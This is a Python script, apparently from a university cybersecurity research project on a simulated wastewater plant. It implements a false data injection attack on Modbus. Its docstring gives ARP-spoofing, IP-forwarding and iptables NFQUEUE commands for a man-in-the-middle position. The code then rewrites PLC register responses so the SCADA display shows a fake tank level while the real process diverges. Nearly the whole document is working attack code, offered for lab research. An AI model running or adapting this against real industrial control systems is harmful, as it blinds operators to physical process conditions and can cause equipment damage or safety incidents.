"""
False Data Injection (FDI) - Sensor de Nível do Tanque
=======================================================
Projeto: Simulador Virtual de ETE para Análise de Segurança Cibernética
Autora:  Leticia dos Santos Matos (PIBIT/UNIFEI 2025)
Fonte:   Relatório Semana 2 (jan/2026)

Descrição:
    Intercepta respostas Modbus FC03/FC04 (Read Holding Registers) do PLC
    e substitui o valor real do sensor de nível por um valor falso fixo.

    Demonstra o efeito de Decoupling (Desacoplamento de Realidade):
    - SCADA lê nível = VALOR_FALSO (ilusão estática)
    - Gêmeo Digital continua simulando o processo real
    - PLC age sobre o processo real -> divergência crescente

    Desafio técnico: registrador de 32 bits, alinhamento de 16 bits.
    OFFSET_DADOS = 2 alinha corretamente ao registrador de nível (0-100).
    OFFSET_DADOS = 0 causava leitura errônea de 3.276.895% no SCADA.

    Infraestrutura de teste:
        PLC Físico: OpenPLC em 192.168.0.85 (Host Windows)
        Vítima HMI: Container fuxa   172.17.0.3
        Atacante:   Container kali   172.17.0.2 (flag --privileged)

    Configuração:
        arpspoof -i eth0 -t 172.17.0.3 172.17.0.1   (Terminal 1)
        arpspoof -i eth0 -t 172.17.0.1 172.17.0.3   (Terminal 2)
        echo 1 > /proc/sys/net/ipv4/ip_forward
        iptables -I FORWARD -j NFQUEUE --queue-num 0
        python3 attack_level.py                       (Terminal 3)

    ATENÇÃO: Para uso exclusivo em ambiente de pesquisa controlado.

Dependências: pip install scapy netfilterqueue
"""

from netfilterqueue import NetfilterQueue
from scapy.all import IP, TCP, Raw
import struct

# --- CONFIGURAÇÕES ---
IP_ALVO_PLC  = "192.168.0.85"  # IP do OpenPLC físico
VALOR_FALSO  = 50              # Valor injetado no sensor (0-100 %)
OFFSET_DADOS = 2               # Ajuste fino para o registrador correto
                               # (alinhamento de 16 bits em inteiro 32 bits)

# Modbus Function Codes para leitura de registradores
FC_READ_HOLDING = 0x03
FC_READ_INPUT   = 0x04


def process_packet(packet):
    scapy_packet = IP(packet.get_payload())

    if not (scapy_packet.haslayer(TCP) and scapy_packet.haslayer(Raw)):
        packet.accept()
        return

    payload = bytes(scapy_packet[Raw].load)

    # Filtra apenas respostas do PLC (porta 502) com FC03 ou FC04
    if scapy_packet[IP].src == IP_ALVO_PLC and scapy_packet[TCP].sport == 502:
        # Verifica se é resposta de leitura de registrador (mínimo 9 bytes)
        if len(payload) > 8:
            func_code = payload[7] if len(payload) > 7 else 0

            if func_code in (FC_READ_HOLDING, FC_READ_INPUT):
                # Calcula a posição do valor a ser injetado
                pos = 8 + OFFSET_DADOS

                if pos + 2 <= len(payload):
                    valor_real = struct.unpack('>H', payload[pos:pos+2])[0]
                    valor_injetado = struct.pack('>H', VALOR_FALSO)

                    # Substituição cirúrgica
                    payload_modificado = (
                        payload[:pos]
                        + valor_injetado
                        + payload[pos+2:]
                    )

                    scapy_packet[Raw].load = payload_modificado
                    del scapy_packet[IP].chksum
                    del scapy_packet[TCP].chksum
                    packet.set_payload(bytes(scapy_packet))

                    print(
                        f"[FDI] Nível injetado: real={valor_real} -> "
                        f"falso={VALOR_FALSO} | offset={OFFSET_DADOS}"
                    )

    packet.accept()


queue = NetfilterQueue()
queue.bind(0, process_packet)
print(f"[*] FDI Sensor Nível ativo. Injetando valor={VALOR_FALSO}%")
print(f"    Alvo: {IP_ALVO_PLC}:502 | Offset: {OFFSET_DADOS}")

try:
    queue.run()
except KeyboardInterrupt:
    print("\n[*] FDI encerrado.")
finally:
    queue.unbind()
